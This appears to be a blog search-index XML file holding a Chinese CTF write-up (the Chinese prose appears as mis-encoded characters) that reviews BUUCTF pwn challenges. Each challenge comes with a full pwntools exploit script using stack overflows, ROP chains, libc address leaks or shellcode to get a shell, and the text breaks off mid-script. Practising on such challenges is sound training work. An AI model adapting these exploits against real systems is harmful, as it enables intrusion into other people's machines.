<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>å¤å¥</title>
    <link href="/2024/03/17/%E5%A4%8D%E5%81%A5/"/>
    <url>/2024/03/17/%E5%A4%8D%E5%81%A5/</url>
    
    <content type="html"><![CDATA[<p>BUUCTF ç¬¬ä¸€é¡µï¼Œæ— è„‘å¤å¥ä¸€ä¸‹</p><span id="more"></span><p><del>è™½ç„¶æœ¬æ¥å°±å¾ˆèœ</del></p><h1 id="åŸºç¡€-ROP"><a href="#åŸºç¡€-ROP" class="headerlink" title="åŸºç¡€ ROP"></a>åŸºç¡€ ROP</h1><h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><p><img src="/img/%E5%A4%8D%E5%81%A5/jarvisoj_level2_main.png"></p><p>å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦æ ˆæº¢å‡ºè°ƒç”¨ system ï¼Œå†æŠŠ system çš„å˜é‡å˜æˆ â€œ<code>/bin/sh</code>â€œå³å¯</p><p>æ‰¾åˆ°ç¨‹åºä¸­æœ‰è¯¥å­—ç¬¦ä¸²</p><p><img src="/img/%E5%A4%8D%E5%81%A5/jarvisoj_level2_sh.png"></p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>sh_bin=<span class="hljs-number">0x600A90</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>system_add=<span class="hljs-number">0x4004C0</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">88</span>+p64(pop_rdi)+p64(sh_bin)+p64(system_addr)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><p>main å‡½æ•°é‡Œçš„é€»è¾‘æ˜¯ï¼š</p><p>ç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼ŒæŠŠè¿™ä¸ªéšæœºæ•°ä½œä¸ºå‚æ•°ä¼ è¿› <code>sub_804871F()</code> å‡½æ•°é‡Œï¼Œç„¶åå°†è¯¥å‡½æ•°è¿”å›çš„ç»“æœä½œä¸ºå‚æ•°å†ä¼ è¿› <code>sub_80487D0()</code> é‡Œ</p><p>å…¶ä¸­ <code>sub_804871F()</code> ä¸­é€»è¾‘å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/%5BOGeek2019%5Dbabyrop-main2.png"></p><p>æˆ‘ä»¬éœ€è¦ä¿è¯ strncmp() çš„ç»“æœä¸ä¸º 0ï¼Œä¸ç„¶ç¨‹åºä¼šå¼‚å¸¸é€€å‡ºã€‚</p><p><code>sub_80487D0()</code> å‡½æ•°ä¸­çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/%5BOGeek2019%5Dbabyrop-read.png"></p><p>ä¼ å…¥çš„è¿™ä¸ª a1 å°±æ˜¯ä¸Šæ–¹  <code>sub_804871F()</code> å‡½æ•°ä¸­è¿”å›çš„ buf ç¬¬ä¸ƒä¸ªå­—èŠ‚çš„ ascii ç ã€‚å› ä¸º buf ç”±æˆ‘ä»¬è‡ªå·±æ¥è¾“å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ read è¯»å…¥çš„é•¿åº¦ï¼Œæ‰€ä»¥å¯ä»¥é€ æˆæº¢å‡ºã€‚</p><p>æ¼æ´å…·ä½“åˆ©ç”¨æ–¹æ³•ï¼š</p><ul><li><p>è¦æ§åˆ¶ <code>strncmp()</code> çš„ç»“æœä¸ä¸º 0ï¼Œå°±è¦ä¿è¯ s å’Œ buf ç›¸ç­‰ã€‚<code>strncmp()</code> ä»¥ <code>&#39;/x00&#39;</code> æˆªæ–­ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¾“å…¥çš„ buf å‰åŠ ä¸Š <code>&#39;/x00&#39;</code> ã€‚</p></li><li><p>è¦åœ¨ <code>sub_80487D0()</code> å‡½æ•°ä¸­é€ æˆæº¢å‡ºï¼Œç¼“å†²åŒºé•¿åº¦å°±æœ‰ 231+4&#x3D;235 è¿™ä¹ˆé•¿ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ª ascii ç è¶³å¤Ÿå¤§çš„å­—ç¬¦ã€‚</p><p>ä½†æ˜¯èƒ½æœåˆ°çš„ ascii ç çš„å­—ç¬¦ï¼Œå®é™…è¾“å‡ºéƒ½æ²¡æœ‰æ‹“å±•è¡¨ä¸­æ ‡æ³¨çš„è¿™ä¹ˆå¤§ã€‚æ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨å¦ä¸€ä¸ªæ–¹æ³•ï¼šè½¬ä¹‰å­—ç¬¦ã€‚</p><blockquote><p>\ ä¸ºè½¬ä¹‰å­—ç¬¦ï¼Œè€Œ â€˜\xhhâ€™ è¡¨ç¤º ASCII ç å€¼ä¸ â€˜hhâ€™ è¿™ä¸ªåå…­è¿›åˆ¶æ•°ç›¸ç­‰çš„ç¬¦å·ï¼Œä¾‹å¦‚ â€˜\xffâ€™ è¡¨ç¤º ASCII ç ä¸º 255 çš„ç¬¦å·ã€‚</p></blockquote></li><li><p>å®ç°æº¢å‡ºååˆ©ç”¨ write() å‡½æ•°æ³„éœ² libc åŸºè´¨ï¼Œè€Œåå›åˆ° main ï¼Œå†æ¬¡ä¿®æ”¹è¿”å›åœ°å€ä¸º system çš„ ROP é“¾</p></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)   <br><br>sh=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28133</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>main_addr= <span class="hljs-number">0x08048825</span><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span><br><br>sh.sendline(payload)<br><br>padding=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">4</span>)<br>payload1=padding+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>sh.sendline(payload1)<br><br>write_addr = u32(sh.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br><br>libc_base = write_addr -  libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br>system_addr = libc_base+libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>bin_sh_addr = libc_base+<span class="hljs-built_in">next</span>(libc.search(flat(<span class="hljs-string">&quot;/bin/sh&quot;</span>)))<br><br>sh.sendline(payload)<br><br>sh.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2 =padding+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(bin_sh_addr)<br>sh.sendline(payload2)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><p>è¶…ç®€å•çš„ ret2shellcodeï¼Œä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_n_5_check.png"></p><p>mainå‡½æ•°ä¸­çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_n_5_main.png"></p><p>æˆ‘ä»¬ç›´æ¥å‘ name ä¸­å†™å…¥ shellcodeï¼Œå†åœ¨è¾“å…¥ text æ—¶æº¢å‡ºä¿®æ”¹è¿”å›åœ°å€åˆ° name åœ°å€å¤„æ‰§è¡Œ shellcode å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25735</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>) <br>shellcode = asm(shellcraft.sh())<br>name_addr = <span class="hljs-number">0x0601080</span><br>p.sendlineafter(<span class="hljs-string">&quot;tell me your name\n&quot;</span>,shellcode)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> + <span class="hljs-number">0x8</span>) + p64(name_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;What do you want to say to me?\n&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import*<br>from LibcSearcher import*<br><br>r=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26445</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>main=<span class="hljs-number">0x400b28</span><br>pop_rdi=<span class="hljs-number">0x400c83</span><br>ret=<span class="hljs-number">0x4006b9</span><br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>r.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=b<span class="hljs-number">&#x27;</span>\<span class="hljs-number">0&#x27;</span>+b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*(<span class="hljs-number">0x50</span><span class="hljs-number">-1</span>+<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br><br>r.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>r.recvline()<br>r.recvline()<br><br>puts_addr = u64(r.recvline()[:<span class="hljs-number">-1</span>].ljust(<span class="hljs-number">8</span>, b<span class="hljs-number">&#x27;</span>\<span class="hljs-number">0&#x27;</span>))<br><br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br>offset=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh=offset+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=offset+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>r.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload=b<span class="hljs-number">&#x27;</span>\<span class="hljs-number">0&#x27;</span>+b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*(<span class="hljs-number">0x50</span><span class="hljs-number">-1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br><br>r.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p>mainå‡½æ•°ä¸­çš„é€»è¾‘å¦‚ä¸‹ï¼Œé¦–å…ˆéœ€è¦è¾“å…¥ä¸€ä¸ªå¯†ç ï¼Œå¯†ç æ­£ç¡®åè¿›å…¥èœå•ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_ne_5_main.png"></p><p>AddLogï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_ne_5_add.png"></p><p>æ¥æ”¶äº†ç”¨æˆ·çš„128é•¿åº¦çš„è¾“å…¥å¹¶å­˜å‚¨åœ¨ a1 ä¸­ï¼Œæ­¤å¤„çš„ a1 å³æ˜¯ main å‡½æ•°ä¸­çš„ <em>src</em> ã€‚ <em>src</em> çš„é•¿åº¦æ˜¯ 48ã€‚</p><p>Printï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_ne_5_system.png"></p><p>è¿™é‡Œé¢è°ƒç”¨äº† <code>system()</code> å‡½æ•°ï¼Œå¯ä»¥ä¾›æˆ‘ä»¬åç»­ä½¿ç”¨ã€‚</p><p>GetFlagï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_ne_5_getflag.png"></p><p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œç¨‹åºå°† src å¤åˆ¶ç»™ destï¼Œè€Œæ­¤å¤„çš„ dest ä¹Ÿæ˜¯ 48 å­—èŠ‚é•¿åº¦ã€‚</p><p>åœ¨æ•´ä¸ªç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Add æ§åˆ¶ src çš„è¾“å…¥ï¼Œå†åˆ©ç”¨ GetFlag å‡½æ•°è¿›è€Œæ§åˆ¶ dest ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€ æˆæº¢å‡ºï¼Œé€šè¿‡æº¢å‡º dest æ§åˆ¶å‡½æ•°çš„è¿”å›åœ°å€ä¸º system()ï¼Œä»è€Œå®ç° getshellã€‚</p><p>ç”¨ ROPgadget æ¥æœç´¢ä¸€ä¸‹ç¨‹åºé‡Œçš„ <code>&#39;/bin/sh&#39;</code> å­—ç¬¦ä¸²çš„åœ°å€ï¼Œæ²¡æœ‰æ‰¾åˆ°ï¼Œä½†æ˜¯å‘ç°æœ‰ <code>&#39;sh&#39;</code> å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªæ•ˆæœæ˜¯ä¸€æ ·çš„</p><p><img src="/img/%E5%A4%8D%E5%81%A5/ciscn_2019_ne_5_sh.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26469</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>password=<span class="hljs-string">&#x27;administrator&#x27;</span><br><br>bin_sh=<span class="hljs-number">0x080482ea</span><br>system_addr=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Please input admin password:&#x27;</span>)<br>sh.sendline(password)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;info:&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">4</span>)+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)<br>sh.sendline(payload)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h3><p>æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œå°±æ˜¯è¿™é“é¢˜æˆ‘åŒ¹é…äº†è¶…å¤š libc ï¼Œè¯•äº†å¾ˆå¤šæ¬¡æ‰æˆåŠŸï¼Œå°±æƒ³è®°å½•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">29454</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>main=<span class="hljs-number">0x040067D</span><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>pop_rdi=<span class="hljs-number">0x0400733</span> <br>ret=<span class="hljs-number">0x04004c9</span> <br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>sh.recvuntil(<span class="hljs-string">&#x27;story!\n&#x27;</span>)<br>sh.sendline(payload)<br><br>puts_addr=u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)  <br>base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)    <br>bin_sh=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)+ p64(pop_rdi) + p64(bin_sh)+p64(system)<br>sh.recvuntil(<span class="hljs-string">&#x27;story!\n&#x27;</span>)<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h3><p>main å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A4%8D%E5%81%A5/%5BHarekazeCTF2019%5Dbaby_rop2_main.png"></p><p>å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œread è¯»å…¥100 å­—èŠ‚ï¼Œbuf é•¿åº¦åªæœ‰ 20ã€‚å¯ä»¥ç”¨æ¥æ³„éœ²åŸºå€åœ¨æ ˆä¸Šæ„é€  <code>system(&quot;/bin/sh&quot;)</code></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªç¨‹åºå½“ä¸­æ˜¯åˆ©ç”¨ printf æ¥è¾“å‡ºåœ°å€ï¼Œå’Œä¹‹å‰çš„ puts ä¸ä¸€æ ·ã€‚</p><p><code>printf</code> å®é™…ä¸Šå°±æ˜¯ <code>int printf( const char* format , [argument] ... );</code>ï¼Œ</p><p>printf é‡Œé¢æœ‰ä¸¤ä¸ªå‚æ•°ï¼ˆputs åªéœ€è¦ä¼ ä¸€ä¸ªï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ä»…è¦æ‰¾ <code>pop_rdi</code> è¿˜è¦æ‰¾ <code>pop_rsi</code> è¿™ä¸ªæŒ‡ä»¤æ¥ä¼ å‚ï¼Œç¨‹åºé‡Œæ‹›åˆ°çš„å¯¹åº”æŒ‡ä»¤è¿˜å¸¦ä¸€ä¸ª <code>pop r15</code>ï¼Œæ²¡å…³ç³»æˆ‘ä»¬åªè¦ç»™å®ƒè®¾ç½®ä¸€ä¸ªå‚æ•° 0 å°±è¡Œã€‚</p><p><img src="/img/%E5%A4%8D%E5%81%A5/%5BHarekazeCTF2019%5Dbaby_rop2_rsi.png"></p><p>æˆ‘ä»¬æ„é€ çš„ payload å°±å†™ä½œï¼š</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload=b&#x27;a&#x27;*(<span class="hljs-number">0</span>x20+8)+p64(<span class="hljs-name">pop_rdi</span>)+p64(<span class="hljs-name">fmt_str</span>)+p64(<span class="hljs-name">pop_rsi_r15</span>)+p64(<span class="hljs-name">read_got</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-name">printf_got</span>)+p64(<span class="hljs-name">main</span>)<br></code></pre></td></tr></table></figure><p>payload è¢«å‘é€å¹¶æ‰§è¡Œåå°±æ˜¯ï¼š</p><ol><li><code>b&#39;a&#39;*(0x20+8)</code> ï¼šæ ˆæº¢å‡ºå°†è¿”å›åœ°å€è¦†ç›–</li><li><code>p64(pop_rdi)+p64(fmt_str)</code>ï¼šåŸæœ¬çš„è¿”å›åœ°å€è¢«æ”¹æˆäº† <code>pop rdi,ret</code> ã€‚<code>pop rdi</code> å¯¹åº”çš„å‚æ•° <em>fmt_str</em> ä¼šå¯¹åº”çš„ä¼šä¼ ç»™ <em>rdi</em> </li><li><code>p64(pop_rsi_r15)+p64(read_got)+p64(0)</code>ï¼š<code>pop_rsi,pop_r15,ret;</code> æ‰§è¡ŒæŒ‡ä»¤ <code>pop_rsi</code> å¯¹åº”å‚æ•° <em>read_got</em> ,å°† <em>rsi</em> å¯„å­˜å™¨çš„å€¼è®¾ç½®æˆäº† read å‡½æ•°çš„ got è¡¨åœ°å€ï¼Œ<code>pop_r15</code> å¯¹åº”å‚æ•° 0ï¼Œæˆ‘ä»¬ä¸ç”¨ <em>r15</em>ï¼Œéšä¾¿è®¾ç½®ä¸€ä¸‹å®ƒå°±è¡Œ</li><li><code>p64(printf_got)</code>ï¼šå°† printf å‡½æ•°çš„ plt è¡¨åœ°å€ä¼ å…¥æ ˆä¸­ï¼Œä»¥å»æ‰§è¡Œ printf å‡½æ•°ï¼Œè¾“å‡ºæˆ‘ä»¬è®¾ç½®çš„ read å‡½æ•°çš„åœ°å€</li><li><code>p64(main)</code>ï¼šåœ¨å®Œæˆç¬¬ä¸€æ¬¡åˆ©ç”¨åï¼Œå¾—åˆ°äº†ç¨‹åºå†…readå‡½æ•°çš„åœ°å€ï¼ŒçŸ¥é“äº†libcåŸºå€ï¼Œæˆ‘ä»¬éœ€è¦é‡æ–°å›åˆ°ç¨‹åºå¼€å¤´ï¼Œå†æ¬¡åˆ©ç”¨è¿™ä¸ªè¾“å…¥ç‚¹å»å†™å…¥ <code>system(&#39;/bin/sh&#39;)</code></li></ol><p>éšåæ­£å¸¸æ„é€ å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>sh=process(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br>main= elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>] <br><br>printf_plt = elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>read_got = elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br><br><br>pop_rdi=<span class="hljs-number">0x0400733</span><br>pop_rsi_r15=<span class="hljs-number">0x0400731</span><br>ret=<span class="hljs-number">0x04004d1</span><br>fmt_str=<span class="hljs-number">0x0400770</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(fmt_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="hljs-number">0</span>)+p64(printf_plt)+p64(main)<br>sh.recvuntil(<span class="hljs-string">&#x27;name?&#x27;</span>)<br>sh.sendline(payload)<br><br>read_addr = u64(sh.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(read_addr))<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc_base = read_addr - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base+<span class="hljs-built_in">next</span>(libc.search(flat(<span class="hljs-string">&quot;/bin/sh&quot;</span>)))  <br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span 